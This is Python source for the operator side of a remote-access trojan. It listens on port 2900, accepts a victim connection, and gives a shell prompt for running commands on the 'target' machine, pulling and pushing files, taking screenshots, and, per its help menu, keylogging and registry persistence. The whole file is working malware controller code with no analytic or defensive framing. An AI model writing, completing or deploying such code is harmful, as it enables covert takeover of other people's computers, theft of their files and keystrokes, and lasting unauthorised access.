import socket
import json
import os
import threading
import subprocess



def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue





def target_communication():
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('cls')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d.png' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif command[:3] == 'dir':
            f = open('dir0.txt', 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
            with open('dir0.txt') as f:
                print (f.read())
            os.remove('dir0.txt')
        elif command[:7] == 'remove ':
            pass
        elif command[:8] == 'ipconfig':
            f = open('ipconfig.txt', 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
            with open('ipconfig.txt') as f:
                print (f.read())
            os.remove('ipconfig.txt')
        elif command == 'help':
            print('''
            quit                                --> Quit Session With The Target
            clear                               --> Clear The Screen
            ipconfig                            --> Show ip of the network of Target System
            dir                                 --> Show the directory On Target System
            cd *Directory Name*                 --> Changes Directory On Target System
            upload *File Name*                  --> Upload File To The target Machine
            download *File Name*                --> Download File From Target Machine
            keylog_start                        --> Start The Keylogger
            keylog_dump                         --> Print Keystrokes That The Target Inputted
            keylog_stop                         --> Stop And Self Destruct Keylogger File
            persistence *RegName* *FileName*    --> Create Presistence In Registry\n''')
        else:
            result = reliable_recv()
            print(result)



sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('0.0.0.0', 2900))
print('[+] Listenin For The Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()


